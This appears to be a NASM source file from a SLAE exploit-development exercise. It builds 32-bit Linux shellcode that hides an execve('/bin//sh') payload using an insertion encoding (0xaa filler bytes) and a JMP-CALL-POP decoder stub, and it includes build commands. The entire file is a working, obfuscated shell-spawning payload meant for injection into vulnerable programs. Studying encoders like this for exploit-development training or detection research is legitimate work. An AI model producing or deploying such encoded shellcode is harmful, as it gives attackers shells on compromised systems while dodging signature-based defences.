; Executable name       : execve4
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of execve shellcode encoded via insertion
;
; Build using these commands:
;       nasm -f elf32 -o execve4.o execve4.asm
;       ld -o execve4 execve4.o
;       objdump -D execve4 -M intel
;

SECTION .text

global _start

_start:
	jmp short call_shellcode			; JMP to label

decoder:
	pop esi						; POP return address (shellcode)
							; into ESI

	lea edi,[esi+1]					; load first 0xaa into edi
	xor eax,eax					; zero out EAX
	mov al,1					; place 1 in AL
	xor ebx,ebx					; zero out EBX

decode:
	mov bl,byte [esi+eax]				; MOV first 0xaa into BL
	xor bl,0xaa					; xor 0xaa,0xaa
	jnz short shellcode				; if ZF not set continue
	mov bl,byte [esi+eax+1]				; place 0xblah into BL
	mov byte [edi],bl				; place 0xblah into EDI
							; meaning 0xblah has overwritten
							; 0xaa

	inc edi						; increment EDI
	add al,2					; add 2 to AL
	jmp short decode				; infinite loop until ZF not set

call_shellcode:
	call decoder					; CALL decoder label

shellcode:
	db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa	; Our encoded shellcode.
	db 0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa	; 0xbb added since xor 0xaa,0xbb
	db 0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa	; is != 0.
	db 0x6e,0xaa,0xb0,0xaa,0x0b,0xaa,0x89,0xaa	; ^
	db 0xe3,0xaa,0xcd,0xaa,0x80,0xaa,0xbb,0xbb	; |
